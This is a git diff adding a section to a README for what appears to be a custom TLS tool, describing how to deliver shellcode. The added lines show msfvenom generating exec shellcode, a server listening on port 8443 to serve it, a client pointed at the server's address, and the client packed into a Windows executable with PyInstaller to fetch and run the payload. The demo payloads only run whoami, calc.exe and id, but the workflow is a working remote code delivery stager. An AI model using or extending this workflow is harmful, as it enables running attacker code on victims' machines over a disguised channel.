@@ -233,6 +233,39 @@ The traffic,
 
 ![tls-flow](images/image2.png)
 
+
+## Example Shellcode Delivery
+
+Server,
+```
+(venv) ➜  my-tls git:(main) ✗ msfvenom -p windows/x64/exec CMD="cmd /c whoami & calc.exe" EXITFUNC=thread > shellcode.bin
+(venv) ➜  my-tls git:(main) ✗ python3 server.py                           
+Usage: python3 server.py <host> <port>
+Usage: python3 server.py <host> <port> <shellcode-location>
+
+        Hint: msfvenom -p linux/x64/exec CMD=id > shellcode.bin
+
+        Hint: msfvenom -p windows/x64/exec CMD="cmd /c whoami & calc.exe"  > shellcode.bin
+(venv) ➜  my-tls git:(main) ✗ python3 server.py 0.0.0.0 8443 shellcode.bin
+[+] Listening on 0.0.0.0:8443
+```
+
+Change block in client.py with server ip
+```
+host = "PLACEHOLDER"
+port = 8443
+```
+
+-change the loader logic depending on your flow-
+
+pack an exe using PyInstaller,
+```
+python -m PyInstaller --onefile client.py
+```
+
+And execute `client.exe`
+
+
 # Sources
 * https://tls12.xargs.org/#server-certificate
 * https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art080
